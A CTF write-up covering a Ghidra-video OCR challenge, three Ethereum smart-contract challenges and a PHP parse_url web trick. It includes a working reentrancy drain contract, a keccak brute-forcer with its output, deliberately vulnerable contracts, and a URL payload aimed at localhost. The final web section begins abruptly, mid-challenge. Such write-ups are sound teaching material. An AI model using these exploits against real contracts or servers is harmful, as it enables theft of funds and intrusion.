## Ghidra Release
The "Ghidra Release" challenge is the needle in a haystack you are trying to shoot blindfolded with a revolver.
A conversation piece is provided:
    [Meanwhile at the NSA on a Friday afternoon]

    Manager: Hey, we're going to be releasing our internal video training for Ghidra and we need you to watch it all to flag any content that needs to be redacted before release.

    Manager: The release is next Monday. Hope you didn't have any weekend plans!

    You: Uhhh, sure bu-

    Manager: Great! Thanks. Make sure nothing gets out.

    You: ... [looks at clock. It reads 3:45PM]

    You: [Mutters to self] No way am I watching all of this:https://static.swampctf.com/ghidra_nsa_training.mp4

    -= Created by DigitalCold =-

By clicking on the link you get a video of 15 hours and 30 in mp4 format. 
Its content consists of white writing on a flowing black background. These are a very complete tutorial of the "Ghidra" reverse engineering program. 
We know that our flag is found among these writings, but we don't know where.

The best strategy to follow is to slice the video into frames and then analyze the text with an OCR tool and then flag it by inserting the first "flag{" part we know in a search tool.

### Step 1
```
    Use "video to video" to slice the video.
    Select "tools" and then "video in image".
    Specify the video to use and the folder in which to save the photos.
    Now go to settings.
    We cannot analyze every single frame for computational reasons.
    It will therefore be necessary to use sample frames every certain number of frames / seconds to reduce the computational effort. 
    We will call this set of frames "network", the more frames we will use the more the network will be thick and we will have more chances of finding the flag.
    The slicing operation could take a long time or even stop automatically if the computer was not sufficiently powerful. Choose a frame size accordingly.
```
### Step 2
```
    Open the terminal in the folder containing the photos and type "ls".
    The list of all the files contained in it will be displayed. Copy this list into a txt file called input.txt.
```
### Step 3
    Create a .c file with the following content:
```
        #include <stdio.h>

int main(void)
{
    FILE*f1;
    FILE*f2;
    f1=fopen("input.txt","r");
    f2=fopen("output.txt","w");
    char name[15];
    int i=0;
    for(i=0;i<55814;i++){
        fscanf(f1,"%s",name);
        fprintf(f2,"tesseract /home/athos/Desktop/ctf/ghidra_nsa_training/%s /home/athos/Desktop/ctf/output/%s \n",name,name);
        fprintf(f2,"echo '%d di 55814' \n",i);
        printf("tesseract /home/athos/Desktop/ctf/ghidra_nsa_training/%s /home/athos/Desktop/ctf/output/%s \n",name,name);
        printf("echo '%d di 55814' \n",i);
    }
    fclose(f1);
    fclose(f2);
    return 0;
}
```
```
    This c program creates the script for the .sh file that will convert the photos from text to frames.

    "/home/athos/Desktop/ctf/ghidra_nsa_training/" is the path to the folder containing the photos. Change this path to that of the folder containing the network.
    "/home/athos/Desktop/ctf/output/" is the path to the folder that will contain the frame texts. Change this path to that of the folder containing the frame texts on the PC.
```
### step 4
```
    Copy the contents of output.txt into an ocr.sh file.
    Obviously it is necessary to add at the beginning of the files "#! / Bin / bash"
    Now open a terminal in the folder containing ocr.sh and run it with ./ocr.sh.
    The program may take a long time to complete.
```
### Step 5
```
    Open a terminal in the folder with the files produced by ocr.sh and type grep -r "flag {".
    It is not certain that you will find the flag at the first attempt. If the search gives results go to the file containing the flag. The OCR is not a foolproof system. Check that the flag is         Correct by going to the relative image file.
    As I said before, you will most likely not find the flag at the first attempt.
    You should start again from step 1 over and over again, increasing the network more and more until you find the flag or until your PC is harakiri.
    The success of this operation is decided by a very important factor called "culo".
```

# Smart

The following challenges were based on Ethereum smart contracts.

## Multi-Owner Contract

> My friend wanted to create a new type of ownable contract where multiple people can be owners. However, when he deployed it for his token sale, someone managed to add themself and many other owners and they minted tons of their own tokens! Luckily the sale hasn't started yet, help him find the bug so he can deploy a new contract and save his ICO.

```
pragma solidity ^0.4.24;

contract Ownable {

    event OwnerAdded(address);
    event OwnerRemoved(address);

    address public implementation;
    mapping (address => bool) public owners;

    modifier onlyOwner() {
        require(owners[msg.sender], "Must be an owner to call this function");
        _;
    }

    /** Only called when contract is instantiated
     */
    function contructor() public payable {
        require(msg.value == 0.5 ether, "Must send 0.5 Ether");
        owners[msg.sender] = true;
    }

    /** Add an owner to the owners list
     *  Only allow owners to add other owners
     */
    function addOwner(address _owner) public onlyOwner {
        owners[_owner] = true;
        emit OwnerAdded(_owner);
    }

    /** Remove another owner
     *  Only allow owners to remove other owners
     */
    function removeOwner(address _owner) public onlyOwner {
        owners[_owner] = false;
        emit OwnerRemoved(_owner);
    }

    /** Remove all owners mapping and relinquish control of contract
     */
    function renounceOwnership() public {
        assembly {
            sstore(owners_offset, 0x0)
        }
    }

    /** CTF helper function
     *  Used to clean up contract and return funds
     */
    function killContract() public onlyOwner {
        selfdestruct(msg.sender);
    }

    /** CTF helper function
     *  Used to check if challenge is complete
     */
    function isComplete() public view returns(bool) {
        return owners[msg.sender];
    }

}
```

This first ETH challenge was quite easy even for somebody who never worked with Smart Contracts before, it just needed some fine grained research (and setting up the development environment, which wasn't so straightforward as well for a novice).

The vulnerability lied in a [malformed constructor](https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118):

```
/* Only called when contract is instantiated */
function contructor() public payable {
    require(msg.value == 0.5 ether, "Must send 0.5 Ether");
    owners[msg.sender] = true;
}
```

Having been prepended with the `function` keyword, this was no more a constructor but instead a publicly callable function; as such, it could be exploited to gain __Owner__ status by just sending 0.5 ETH its way.

## Hash Slinging Slasher

> Try to guess the random number I chose. I've hashed the value before storing it in the contract so you can't cheat! You'll never figure this one out :)

```
pragma solidity ^0.4.24;

contract HashSlingingSlasher {

    bytes32 answer = 0xed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1;

    constructor() public payable {
        require(msg.value == 0.5 ether, "Must send 0.5 Ether");
    }

    /** Guess the hashed number. Refunds ether if guessed correctly
     */
    function guess(uint16 number) public payable {
        require(msg.value == 0.25 ether, "Must send 0.25 Ether");
        if(keccak256(abi.encodePacked(number)) == answer) {
            msg.sender.transfer(address(this).balance);
        }
    }

    /** Returns balance of this contract
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /** CTF helper function
     *  Used to check if challenge is complete
     */
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

}
```

The `guess` function takes a number, encodes it via `abi.encodePacked` and then hashes it via `keccak256` (Ethereum's hashing algorithm, a SHA-3 variant that predates its final and official release).

Since `guess` takes its input as an _uint16_, the keyspace for a bruteforce attack would be composed of single integers in the range _{0..65535}_. No fuss with any modern processor! The encoding function can be replicated as well: [it is equivalent byte-casting](https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8#3f98).

Due to this additional encoding needed before hashing, using cracking tools like Hashcat became too cumbersome and instead we rolled our own bruteforcer:

```python
#!/usr/bin/env python3

import sha3  # pip install pysha3
import struct
import sys


def hash(packed):
    """
    Compute the Keccak256 has of a string/byte/packed object.
    """
    k = sha3.keccak_256()
    k.update(packed)
    return k.hexdigest()


def iterate(endianness, min_n, max_n, target):
    """
    Iterate from min_n to max_n, pack the number with the given endianness,
    hash it and compare it with the target.
    """
    for i in range (min_n, max_n+1):
        print("*** Trying {} ({} endian)...".format(i, endianness), end='\r')
        packing_fmt = '<H' if endianness == 'little' else '>H'
        packed = struct.pack(packing_fmt, i)
        hexdigest = hash(packed)
        if hexdigest == target:
            print("\n>>> FOUND! {} <<<".format(i))
            print("\tTarget: {}".format(target))
            print("\tHashed: {}".format(hexdigest))
            print("\tPacked: {}\n".format(packed))
            return
    print("*** No matching hash found.")


def main():
    if (len(sys.argv) < 4):
        print("Usage: ./crack_keccak.py {TARGET_HASH} {MIN_N} {MAX_N}\n")
        quit(1)

    target = sys.argv[1]
    min_n = int(sys.argv[2])
    max_n = int(sys.argv[3])
    print("*** Targeting hash: {} with keyspace {}-{}\n".format(target, min_n, max_n))

    iterate('little', min_n, max_n, target)
    iterate('big', min_n, max_n, target)


if __name__ == '__main__':
    main()
```

```no-highlight
$ ./crack_keccak.py ed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1 0 65535
*** Targeting hash: ed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1 with keyspace 0-65535

*** Trying 6452 (little endian)...
>>> FOUND! 6452 <<<
	Target: ed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1
	Hashed: ed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1
	Packed: b'4\x19'

*** Trying 13337 (big endian)...
>>> FOUND! 13337 <<<
	Target: ed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1
	Hashed: ed2a0ca74e236c332625ad7f4db75b63d2a2ee7e3fe52c2c93c8dbc4e06906d1
	Packed: b'4\x19'
```

At first endianness wasn't accounted for in this solution and numbers were only packed as little endian, but since `6452` didn't get us the flag the second endianness check was implemented and indeed the right number to feed to `guess` turned out to be `13337`.

## Refundable Purchase

>I've created a contract to make buying items online safer! (for the buyer at least)
>The funds stay in escrow in the contract until the buyer has received the item, in which they report they've received it (people are always honest, right!?).
>If they never receive the item, they can call refund to return their spent ether.
>Find a way to drain this contract of all pending refunds.

```
pragma solidity ^0.4.24;

contract RefundablePurchase {

    event Refund(address, uint256);
    event PurchaseCompleted(address, uint256);

    address owner;

    mapping (address => uint256) public refunds;

    constructor() public payable {
        require(msg.value == 0.5 ether, "Must send 0.5 Ether");
    }

    /** Fallback function, called when contract receives Ether without data
     */
    function () external payable {
        require(refunds[msg.sender] + msg.value > refunds[msg.sender]); // Overflow guard
        refunds[msg.sender] += msg.value;
    }

    /** Refunds sent Ether
     */
    function refund() public {
        require(refunds[msg.sender] > 0);
        uint256 amount = refunds[msg.sender];
        msg.sender.call.value(amount)("");
        refunds[msg.sender] = 0;
        emit Refund(msg.sender, amount);
    }

    /** Call this function once you've received your purchased item
     */
    function completePurchase() public {
        require(refunds[msg.sender] > 0);
        uint256 amount = refunds[msg.sender];
        refunds[msg.sender] = 0;
        emit PurchaseCompleted(msg.sender, amount);
    }

    /** Returns balance of this contract
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /** CTF helper function
     *  Used to check if challenge is complete
     */
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

}
```

As the isComplete() function says, we must somehow completely drain the initial balance with which the contract is deployed.

Analysing the contract we see that any balance received is processed in the fallback function and then added to our refund amount variable, which is mapped to our address (**`msg.sender`**).
Afterward we can either confirm the balance sent (**`completePurchase()`**) or get it back (**`refund()`**).

Examining the refund() function in particular we see there's a vulnerability we can exploit.
```
/** Refunds sent Ether
*/
function refund() public {
    require(refunds[msg.sender] > 0);
    uint256 amount = refunds[msg.sender];
    msg.sender.call.value(amount)("");
    refunds[msg.sender] = 0;
    emit Refund(msg.sender, amount);
}
```
There's a combination of `msg.sender.call.value(amount)("");` that does not take into account the gas limitation, and the reset of refunds that occurs only after the transaction has been processed. In this situation we can make a so-called Reentrancy Attack.

Let's create another smart contract that interacts with the deployed RefundablePurchase one (hereinafter referred to as 'main contract').
We'll need to write a function that receives balance, sends it to the main contract and then claim it back calling **`refund()`**.
To complete the exploit, only remains to create a fallback function that once again calls the **`refund()`** method.

The fallback function is going to be triggered when in the main contract the balance is sent back through `msg.sender.call.value(amount)("");`. This is where the reentrancy attack occurs because there's a loop that repeats until the balance is drained. One implementation could be as follows:
```
pragma solidity ^0.4.24;

import "./RefundablePurchase.sol";

contract DrainRefundable {
  RefundablePurchase public atAddress;
  
  constructor (address deploymentAddress) public {
    atAddress = RefundablePurchase(deploymentAddress);
  }
  
  function () public payable {
    if (address(atAddress).balance >= msg.value) {
      atAddress.refund();
    }
  }
  
  function drain() public payable {
    address(atAddress).call.value(msg.value)();
    atAddress.refund();
  }
}
```
After calling the drain() function of the deployed 'DrainRefundable' smart contract with 0.5 ETH, a quick check at the function getBalance() returns 0, therefore calling isComplete() returns true.

Feeding in URLs worked as axpected:

![Brokerboard expected](/assets/img/SwampCTF_2019/brokerboard_2.png)

Since the backstory of the challenge pointed to PHP's `parse_url` function, it was enough to find [an interesting known vulnerability](https://cxsecurity.com/issue/WLB-2017070054) that enabled users to feed malformed data to it: the string `https://born2scan.github.io:80#@localhost/key` would be splitted on the hash and the second part would be evaluated without checks.
